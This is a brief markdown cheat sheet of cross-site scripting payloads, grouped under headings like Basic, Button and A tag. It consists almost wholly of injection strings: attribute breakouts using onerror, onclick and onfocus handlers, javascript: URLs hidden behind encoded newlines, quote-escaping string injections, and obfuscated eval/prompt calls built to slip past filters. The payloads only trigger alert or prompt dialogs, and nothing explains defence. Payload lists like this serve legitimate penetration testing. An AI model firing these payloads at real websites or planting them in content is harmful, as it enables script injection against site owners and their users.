# XSS

**Basic**
```
"><img src=x onerror=alert()>
```

**Button**
```
<Button href="javascript://%0aalert(123)">
XSS with %0a
</Button>
<Button href="javascript://%0dalert(document.domain)">
XSS with %0d
</Button>
```

**A tag**
```
"><a href="javascript:alert(0)">click here</a>
```

```
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
```

```
'';!--"<XSS>=&{()}
\";alert('XSS');//
'); alert('XSS
'); alert('xss'); var x='
\\'); alert(\'xss\');var x=\'
‘; alert(1);
‘)alert(1);//
```

```
<marguee/onstart=alert(1)>
```
